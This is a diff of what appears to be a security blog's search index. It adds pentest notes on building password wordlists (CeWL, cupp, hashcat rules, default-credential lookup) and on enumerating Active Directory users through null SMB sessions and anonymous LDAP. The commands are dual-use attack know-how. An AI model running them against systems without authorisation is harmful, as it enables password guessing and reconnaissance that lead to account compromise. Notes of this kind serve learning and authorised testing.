-<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
+]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Writing Custom Wordlists and Rules</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
       </categories>
       <tags>
-        <tag>Creds</tag>
-        <tag>CeWL</tag>
-        <tag>Cupp</tag>
-        <tag>Hashcat Rules</tag>
+        <tag>mimikatz</tag>
+        <tag>Invoke-TheHash</tag>
       </tags>
   </entry>
   <entry>
@@ -2530,6 +2443,93 @@
       <tags>
         <tag>mimikatz</tag>
         <tag>Invoke-TheHash</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Writing Custom Wordlists and Rules</title>
+    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
+    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
+
+<p>Example :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
+<ul>
+<li>Depth to spider (<code>-d</code>)</li>
+<li>The minimum length of the word (<code>-m</code>)</li>
+<li>The storage of the found words in lowercase (<code>--lowercase</code>)</li>
+<li>The file where we want to store the results (<code>-w</code>)</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl https://website -d 4 -m 6 --lowercase -w wordlist.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Cupp"><a href="#Cupp" class="headerlink" title="Cupp"></a>Cupp</h1><blockquote>
+<p>We can perform OSINT gathering and feed the collected information into <code>cupp</code> to generate a personalized wordlist.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cupp -i</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Hashcat-Rules"><a href="#Hashcat-Rules" class="headerlink" title="Hashcat Rules"></a>Hashcat Rules</h1><h3 id="Predefined-Rules"><a href="#Predefined-Rules" class="headerlink" title="Predefined Rules"></a>Predefined Rules</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> /usr/share/hashcat/rules/</span><br><span class="line"></span><br><span class="line">best64.rule</span><br><span class="line">dive.rule</span><br><span class="line">generated2.rule</span><br><span class="line">rockyou-30000.rule</span><br><span class="line">hob0rules</span><br></pre></td></tr></table></figure>
+
+<h3 id="Writing-Custom-Rules"><a href="#Writing-Custom-Rules" class="headerlink" title="Writing Custom Rules"></a>Writing Custom Rules</h3><blockquote>
+<p><code>:</code>      Do nothing<br><code>l</code>      Lowercase all letters<br><code>u</code>      Uppercase all letters                        <br><code>c</code>      Capitalize the first letter and lowercase others<br><code>sXY</code>   Replace all instances of X with Y                <br><code>$!</code>     Add the exclamation character at the end</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> custom.rule</span><br><span class="line"></span><br><span class="line">:</span><br><span class="line">c</span><br><span class="line">so0</span><br><span class="line">c so0</span><br><span class="line">sa@</span><br><span class="line">c sa@</span><br><span class="line">c sa@ so0</span><br><span class="line">$!</span><br><span class="line">$! c</span><br><span class="line">$! so0</span><br><span class="line">$! sa@</span><br><span class="line">$! c so0</span><br><span class="line">$! c sa@</span><br><span class="line">$! so0 sa@</span><br><span class="line">$! c so0 sa@</span><br></pre></td></tr></table></figure>
+
+<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Writing Custom Wordlists and Rules</category>
+      </categories>
+      <tags>
+        <tag>Creds</tag>
+        <tag>CeWL</tag>
+        <tag>Cupp</tag>
+        <tag>Hashcat Rules</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Making a Target User List</title>
+    <url>/2025/12/03/Making-a-Target-User-List/</url>
+    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Making a Target User List</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+        <tag>windapsearch</tag>
       </tags>
   </entry>
 </search>
